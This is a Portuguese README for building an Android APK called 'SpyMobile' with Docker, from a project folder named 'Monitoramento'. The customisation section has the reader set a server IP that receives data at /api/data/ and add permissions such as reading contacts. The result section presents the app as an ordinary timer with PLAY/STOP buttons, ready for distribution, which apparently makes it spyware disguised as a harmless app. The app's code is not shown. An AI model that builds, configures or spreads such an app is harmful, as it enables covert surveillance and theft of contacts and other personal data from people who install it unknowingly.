# 🐳 GERAR APK COM DOCKER NO WINDOWS

## 🚀 MÉTODO MAIS CONFIÁVEL E RÁPIDO

### PRÉ-REQUISITOS:
- **Docker Desktop** instalado e rodando
- **8GB RAM** disponível
- **10GB espaço** em disco

## ⚡ PASSO A PASSO:

### PASSO 1 - Instalar Docker Desktop
1. Baixe: https://www.docker.com/products/docker-desktop/
2. Instale e reinicie o computador
3. Abra Docker Desktop e aguarde inicializar

### PASSO 2 - Verificar Arquivos
Certifique-se que estes arquivos estão na pasta:
```
📁 Monitoramento/
├── Dockerfile
├── docker-entrypoint.sh
├── main.py
├── buildozer.spec
└── gerar_apk_docker.bat
```

### PASSO 3 - Executar Script
```cmd
# Execute como Administrador:
gerar_apk_docker.bat
```

## 🔥 PROCESSO AUTOMÁTICO:

1. **Constrói imagem Docker** (5-10 minutos)
2. **Baixa Android SDK/NDK** (automático)
3. **Gera APK** (20-30 minutos)
4. **Copia APK** para pasta `output/`

## 📱 RESULTADO:

- **APK pronto** em `output/SpyMobile.apk`
- **Tamanho**: ~15-20MB
- **Compatível**: Android 5.0+
- **Arquitetura**: ARM (99% dos dispositivos)

## 🎯 VANTAGENS DO DOCKER:

✅ **Ambiente isolado** - sem conflitos  
✅ **Reproduzível** - funciona sempre igual  
✅ **Mais rápido** - imagem reutilizável  
✅ **Sem configuração** - tudo automatizado  
✅ **Multiplataforma** - funciona em qualquer OS  

## 🔧 COMANDOS MANUAIS:

### Construir imagem:
```cmd
docker build -t spy-mobile-builder .
```

### Gerar APK:
```cmd
docker run --rm -v "%cd%\output:/app/output" spy-mobile-builder
```

### Ver logs detalhados:
```cmd
docker run --rm -v "%cd%\output:/app/output" spy-mobile-builder --verbose
```

## 🛠️ PERSONALIZAÇÃO:

### Alterar IP do servidor:
Edite `main.py` linha 94:
```python
'http://SEU_IP_AQUI:8000/api/data/'
```

### Mudar nome do app:
Edite `buildozer.spec`:
```ini
title = Meu App
package.name = meuapp
```

### Adicionar permissões:
Edite `buildozer.spec`:
```ini
[app:android.permissions]
READ_CONTACTS = 1
WRITE_EXTERNAL_STORAGE = 1
```

## 🔍 SOLUÇÃO DE PROBLEMAS:

### Docker não inicia:
```cmd
# Reiniciar serviço Docker:
net stop com.docker.service
net start com.docker.service
```

### Erro de memória:
```cmd
# Aumentar RAM do Docker:
# Docker Desktop → Settings → Resources → Memory → 8GB
```

### Erro de espaço:
```cmd
# Limpar imagens antigas:
docker system prune -a
```

### Build falha:
```cmd
# Reconstruir sem cache:
docker build --no-cache -t spy-mobile-builder .
```

## ⏰ TEMPO ESTIMADO:

- **Primeira execução**: 30-40 minutos
- **Execuções seguintes**: 20-25 minutos
- **Apenas APK** (imagem já construída): 15-20 minutos

## 📋 CHECKLIST:

- [ ] Docker Desktop instalado e rodando
- [ ] Arquivos na pasta correta
- [ ] 8GB RAM disponível
- [ ] 10GB espaço em disco
- [ ] Executar como Administrador

## 🎉 RESULTADO FINAL:

Você terá um **APK funcional** com:
- Timer digital
- Botões PLAY/STOP
- Conexão com servidor Django
- Interface profissional
- Pronto para distribuição

**Este é o método mais confiável!** 🚀